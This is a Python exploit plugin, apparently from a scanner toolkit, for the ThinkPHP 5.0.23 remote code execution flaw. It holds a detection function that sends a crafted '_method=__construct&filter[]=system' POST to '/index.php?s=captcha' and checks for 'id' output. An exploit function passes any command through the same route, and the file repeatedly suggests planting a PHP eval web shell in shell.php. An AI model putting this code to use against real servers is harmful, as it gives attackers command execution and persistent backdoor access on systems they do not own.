#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  """可执行命令或使用shell连接: echo '<?php @eval($_POST[1]);?>' > shell.php""",

      'method'    :   'post',

      'bugname'   :   'thinkphp- 5.0.23-RCE',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/index.php?s=captcha'
  data = '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'uid.*?gid.*?groups.*?',res.text,re.S):
      # ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret
def exp(url,ua,shell):
  ret = msg()
  headers = {
        'User-Agent': ua,
        }
  target = '/index.php?s=captcha'
  data = f'_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]={shell}'
  url1 = url + target 
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    """echo '<?php @eval($_POST[1]);?>' > shell.php"""
    print('响应码：'+res.status_code)
    print('如果响应码为500，则shell可能上传成功')
    if res.status_code != 500:
      print(res.text)
  except:
    print('连接失败！')
